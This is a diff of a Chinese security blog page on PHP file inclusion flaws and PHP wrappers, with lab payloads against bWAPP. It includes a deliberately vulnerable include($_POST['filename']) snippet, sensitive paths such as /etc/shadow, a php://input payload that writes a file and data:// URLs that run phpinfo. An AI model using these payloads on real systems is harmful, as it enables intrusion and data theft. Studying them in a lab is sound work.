@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      文件包含漏洞 | pidandoufu
+      文件包含漏洞和PHP伪协议 | pidandoufu
     
   </title>
   <meta name="author" content="pidandoufu">
@@ -160,7 +160,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《文件包含漏洞》
+			当前文章&nbsp;:&nbsp;《文件包含漏洞和PHP伪协议》
 		
 	</p>
 
@@ -258,6 +258,18 @@
 		插件作者：KELEN
 		插件来源: https://github.com/KELEN/katelog
 -->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
 	 
 
 <div class="layout-post">
@@ -266,7 +278,7 @@
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
 	<a href="/2019/04/28/文件上传的七种姿势/" itemprop="url">
-		文件包含漏洞
+		文件包含漏洞和PHP伪协议
 	</a>
 
 	</div>
@@ -299,7 +311,7 @@
 
 	<a href="/2019/04/28/文件上传的七种姿势/" itemprop="url">
 		<time datetime="2019-04-28T01:39:15.000Z" itemprop="dateUpdated">
-	  		2019-05-03
+	  		2019-05-07
 	  </time>
 	</a> 
 
@@ -310,8 +322,8 @@
 			<i class="fa fa-tags"></i>
 			
 	
-		<a href="/tags/文件上传/" class=" ">
-			文件上传
+		<a href="/tags/文件包含/" class=" ">
+			文件包含
 		</a>
 	
 		
@@ -320,7 +332,7 @@
 		
 
 	
-    <span class="leancloud_visitors" id="/2019/04/28/文件上传的七种姿势/_visitors" data-url="/2019/04/28/文件上传的七种姿势/" data-title="文件包含漏洞">
+    <span class="leancloud_visitors" id="/2019/04/28/文件上传的七种姿势/_visitors" data-url="/2019/04/28/文件上传的七种姿势/" data-title="文件包含漏洞和PHP伪协议">
        	<i class="fa fa-eye"></i>
        	热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
@@ -330,7 +342,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2019/04/28/文件上传的七种姿势/_likes" data-url="/2019/04/28/文件上传的七种姿势/" data-title="文件包含漏洞" rel="unlike">
+    <span class="leancloud_likes" id="/2019/04/28/文件上传的七种姿势/_likes" data-url="/2019/04/28/文件上传的七种姿势/" data-title="文件包含漏洞和PHP伪协议" rel="unlike">
         <i class="fa fa-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -340,16 +352,29 @@
 
 	<div class="article-content" id="article-content">
 		<a id="more"></a>
-<p>文件包含的漏洞形成</p>
-<p>文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshell。</p>
-<p>文件包含的主要函数：</p>
-<ul>
+<h2 id="文件包含的漏洞形成"><a href="#文件包含的漏洞形成" class="headerlink" title="文件包含的漏洞形成"></a>文件包含的漏洞形成</h2><h4 id="文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshell。"><a href="#文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshell。" class="headerlink" title="文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshell。"></a>文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshell。</h4><h4 id="文件包含的主要函数："><a href="#文件包含的主要函数：" class="headerlink" title="文件包含的主要函数："></a>文件包含的主要函数：</h4><ul>
 <li>include()</li>
 <li>include_once</li>
 <li>require()</li>
 <li>require_once()</li>
 </ul>
-	
+<h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><h4 id="相同点：include和require-都能把另外一个文件包含到当前文件中。"><a href="#相同点：include和require-都能把另外一个文件包含到当前文件中。" class="headerlink" title="相同点：include和require 都能把另外一个文件包含到当前文件中。"></a>相同点：include和require 都能把另外一个文件包含到当前文件中。</h4><h4 id="不同点：使用include时，当包含的文件不存在时，系统会报出警告级别的错误，程序会继续往下执行。-使用require包含文件时，当包含的文件不存在时，系统会先报出警告级别的错误，接着又报一个致命级别的错误。程序将终止执行。-require能让php的程序得到更高的效率，在同一php文件中解释过一次后，不会再解释第二次。而include却会重复的解释包含的文件。所以当php网页中使用循环或条件语句引入文件时，”require”则不会做任何的改变，当出现这种情况，必须使用”include”命令来引入文件。"><a href="#不同点：使用include时，当包含的文件不存在时，系统会报出警告级别的错误，程序会继续往下执行。-使用require包含文件时，当包含的文件不存在时，系统会先报出警告级别的错误，接着又报一个致命级别的错误。程序将终止执行。-require能让php的程序得到更高的效率，在同一php文件中解释过一次后，不会再解释第二次。而include却会重复的解释包含的文件。所以当php网页中使用循环或条件语句引入文件时，”require”则不会做任何的改变，当出现这种情况，必须使用”include”命令来引入文件。" class="headerlink" title="不同点：使用include时，当包含的文件不存在时，系统会报出警告级别的错误，程序会继续往下执行。   使用require包含文件时，当包含的文件不存在时，系统会先报出警告级别的错误，接着又报一个致命级别的错误。程序将终止执行。   require能让php的程序得到更高的效率，在同一php文件中解释过一次后，不会再解释第二次。而include却会重复的解释包含的文件。所以当php网页中使用循环或条件语句引入文件时，”require”则不会做任何的改变，当出现这种情况，必须使用”include”命令来引入文件。"></a>不同点：使用include时，当包含的文件不存在时，系统会报出警告级别的错误，程序会继续往下执行。   使用require包含文件时，当包含的文件不存在时，系统会先报出警告级别的错误，接着又报一个致命级别的错误。程序将终止执行。   require能让php的程序得到更高的效率，在同一php文件中解释过一次后，不会再解释第二次。而include却会重复的解释包含的文件。所以当php网页中使用循环或条件语句引入文件时，”require”则不会做任何的改变，当出现这种情况，必须使用”include”命令来引入文件。</h4><h5 id="require-once-：如果该文件中的代码已经被包含了，则不会再次包含-应该用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。"><a href="#require-once-：如果该文件中的代码已经被包含了，则不会再次包含-应该用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。" class="headerlink" title="require_once()：如果该文件中的代码已经被包含了，则不会再次包含 应该用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。"></a>require_once()：如果该文件中的代码已经被包含了，则不会再次包含 应该用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。</h5><h5 id="include-once（）：同require-once"><a href="#include-once（）：同require-once" class="headerlink" title="include_once（）：同require_once()"></a>include_once（）：同require_once()</h5><h4 id="文件包含示例代码："><a href="#文件包含示例代码：" class="headerlink" title="文件包含示例代码："></a>文件包含示例代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    $filename = $_POST[&apos;filename&apos;];</span><br><span class="line">    include($filename);</span><br><span class="line"> ？&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="比如-当客户端POST过来一个filename的值，-POST-‘filename’-没有对filename的内容进行检测限制，这样就产生了问文件包含漏洞。"><a href="#比如-当客户端POST过来一个filename的值，-POST-‘filename’-没有对filename的内容进行检测限制，这样就产生了问文件包含漏洞。" class="headerlink" title="比如:当客户端POST过来一个filename的值， $_POST[‘filename’];没有对filename的内容进行检测限制，这样就产生了问文件包含漏洞。"></a>比如:当客户端POST过来一个filename的值， $_POST[‘filename’];没有对filename的内容进行检测限制，这样就产生了问文件包含漏洞。</h5><p><img src="/img/baohan1.png" alt="baohan1"></p>
+<h2 id="linux系统敏感信息路径："><a href="#linux系统敏感信息路径：" class="headerlink" title="linux系统敏感信息路径："></a>linux系统敏感信息路径：</h2><ul>
+<li><h4 id="etc-passwd-账户信息"><a href="#etc-passwd-账户信息" class="headerlink" title="/etc/passwd // 账户信息"></a>/etc/passwd // 账户信息</h4></li>
+<li><h5 id="etc-shadow-账户密码文件"><a href="#etc-shadow-账户密码文件" class="headerlink" title="/etc/shadow // 账户密码文件"></a>/etc/shadow // 账户密码文件</h5></li>
+<li><h5 id="etc-my-conf-mysql-配置文件"><a href="#etc-my-conf-mysql-配置文件" class="headerlink" title="/etc/my.conf // mysql 配置文件"></a>/etc/my.conf // mysql 配置文件</h5></li>
+<li><h5 id="etc-httpd-conf-httpd-conf-Apache配置文件"><a href="#etc-httpd-conf-httpd-conf-Apache配置文件" class="headerlink" title="/etc/httpd/conf/httpd.conf // Apache配置文件"></a>/etc/httpd/conf/httpd.conf // Apache配置文件</h5></li>
+</ul>
+<h5 id="还有就是通过获取php版本来查看session的存储位置获取获取路径："><a href="#还有就是通过获取php版本来查看session的存储位置获取获取路径：" class="headerlink" title="还有就是通过获取php版本来查看session的存储位置获取获取路径："></a>还有就是通过获取php版本来查看session的存储位置获取获取路径：</h5><p><img src="/img/baohan2.png" alt="baohan2"></p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h4 id="文件包含函数：include、require、include-once、require-once、highlight-file-、show-source-、readfile-、file-get-contents-、fopen-、file-。"><a href="#文件包含函数：include、require、include-once、require-once、highlight-file-、show-source-、readfile-、file-get-contents-、fopen-、file-。" class="headerlink" title="文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。"></a>文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。</h4><h4 id="首先归纳下常见的文件包含函数：include、require、include-once、require-once、highlight-file-、show-source-、readfile-、file-get-contents-、fopen-、file，计划对文件包含漏洞与php封装协议的利用方法进行总结，相关协议：file-、php-filter、php-input、zip-、compress-bzip2-、compress-zlib-、data-，下面这张图总结了我们伪协议及需要的环境"><a href="#首先归纳下常见的文件包含函数：include、require、include-once、require-once、highlight-file-、show-source-、readfile-、file-get-contents-、fopen-、file，计划对文件包含漏洞与php封装协议的利用方法进行总结，相关协议：file-、php-filter、php-input、zip-、compress-bzip2-、compress-zlib-、data-，下面这张图总结了我们伪协议及需要的环境" class="headerlink" title="首先归纳下常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，计划对文件包含漏洞与php封装协议的利用方法进行总结，相关协议：file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://，下面这张图总结了我们伪协议及需要的环境"></a>首先归纳下常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，计划对文件包含漏洞与php封装协议的利用方法进行总结，相关协议：file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://，下面这张图总结了我们伪协议及需要的环境</h4><p><img src="/img/weixieyi.png" alt="weixieyi"></p>
+<h3 id="下面我们对部分进行了演示："><a href="#下面我们对部分进行了演示：" class="headerlink" title="下面我们对部分进行了演示："></a>下面我们对部分进行了演示：</h3><h4 id="1-利用php-input-写入一句话，"><a href="#1-利用php-input-写入一句话，" class="headerlink" title="1.利用php://input 写入一句话，"></a>1.利用php://input 写入一句话，</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/bWAPP/rlfi.php?language=php://input&amp;action=go</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;123.php&quot;, &quot;w&quot;),base64_decode(&quot;PD9waHAgIHBocGluZm8oKTsgPz4=&quot;));?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/input1.png" alt="input1"></p>
+<p><img src="/img/input2.png" alt="input2"></p>
+<h4 id="2-利用data协议"><a href="#2-利用data协议" class="headerlink" title="2.利用data协议"></a>2.利用data协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://IP/bWAPP/rlfi.php?language=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://IP/bWAPP/rlfi.php?language=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">http://IP/bWAPP/rlfi.php?language=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://ip/bWAPP/rlfi.php?language=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+<p><img src="/img/data.png" alt="data"></p>
+<h4 id="3-zip的需要我们上传zip的文件，然后和上述操作一样，用zip的方式包含过来"><a href="#3-zip的需要我们上传zip的文件，然后和上述操作一样，用zip的方式包含过来" class="headerlink" title="3.zip的需要我们上传zip的文件，然后和上述操作一样，用zip的方式包含过来"></a>3.zip的需要我们上传zip的文件，然后和上述操作一样，用zip的方式包含过来</h4>	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -390,6 +415,35 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/05/06/存储型xss-H5页面截取/" title="存储型xss-H5页面截取">
+								存储型xss-H5页面截取			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 6日, 2019				
+							</p>
+							<p class="relate-post-content">
+								环境准备
+
+一个有XSS漏洞的页面，或者搭建一个漏洞平台
+注册一个线上的XSS漏洞测试平台（有能力可以自己搭）
+
+
+1.首先我们需要搭建一个本地的漏洞测试平台，这里我用的事pikachu漏洞平台（https://github.com/...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/05/06/存储型xss-H5页面截取/" title="存储型xss-H5页面截取">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="存储型xss-H5页面截取">
+							</a>
+						</div>
+					</li>											
+			
 			
 					<li>
 						<div class="relate-post-text">
@@ -435,35 +489,6 @@
 							<a href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="一句话木马及变形">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/05/06/存储型xss-H5页面截取/" title="存储型xss-H5页面截取">
-								存储型xss-H5页面截取			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								五月 6日, 2019				
-							</p>
-							<p class="relate-post-content">
-								环境准备
-
-一个有XSS漏洞的页面，或者搭建一个漏洞平台
-注册一个线上的XSS漏洞测试平台（有能力可以自己搭）
-
-
-1.首先我们需要搭建一个本地的漏洞测试平台，这里我用的事pikachu漏洞平台（https://github.com/...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/05/06/存储型xss-H5页面截取/" title="存储型xss-H5页面截取">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="存储型xss-H5页面截取">
 							</a>
 						</div>
 					</li>											
